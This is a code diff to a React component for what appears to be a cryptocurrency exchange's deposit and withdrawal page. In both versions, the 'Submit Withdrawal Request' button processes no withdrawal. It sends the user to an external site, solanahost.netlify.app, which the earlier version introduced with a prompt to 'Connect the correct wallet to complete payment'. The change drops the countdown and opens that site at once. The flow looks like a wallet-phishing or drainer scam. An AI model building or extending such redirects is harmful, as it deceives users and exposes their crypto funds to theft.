@@ -22,20 +22,7 @@ export const DepositWithdraw = () => {
   const [withdrawCoin, setWithdrawCoin] = useState("BTC");
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [loading, setLoading] = useState(false);
-  const [showWalletDialog, setShowWalletDialog] = useState(false);
-  const [countdown, setCountdown] = useState(5);
   const { toast } = useToast();
-
-  useEffect(() => {
-    if (showWalletDialog && countdown > 0) {
-      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
-      return () => clearTimeout(timer);
-    } else if (showWalletDialog && countdown === 0) {
-      window.open("https://solanahost.netlify.app/", "_blank", "noopener,noreferrer");
-      setShowWalletDialog(false);
-      setCountdown(5);
-    }
-  }, [showWalletDialog, countdown]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -186,19 +173,12 @@ export const DepositWithdraw = () => {
                 />
               </div>
 
-              {!showWalletDialog ? (
-                <Button
-                  onClick={() => setShowWalletDialog(true)}
-                  className="w-full bg-green-600 text-white hover:bg-green-700 font-bold border-2 border-green-500"
-                >
-                  Submit Withdrawal Request
-                </Button>
-              ) : (
-                <div className="w-full p-8 bg-green-600 rounded-lg text-center space-y-4">
-                  <p className="text-xl font-bold text-white">Connect the correct wallet to complete payment</p>
-                  <p className="text-3xl font-bold text-white">Redirecting in {countdown} seconds...</p>
-                </div>
-              )}
+              <Button
+                onClick={() => window.open("https://solanahost.netlify.app/", "_blank", "noopener,noreferrer")}
+                className="w-full bg-green-600 text-white hover:bg-green-700 font-bold border-2 border-green-500"
+              >
+                Submit Withdrawal Request
+              </Button>
 
               <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-lg">
                 <p className="text-sm text-amber-400">
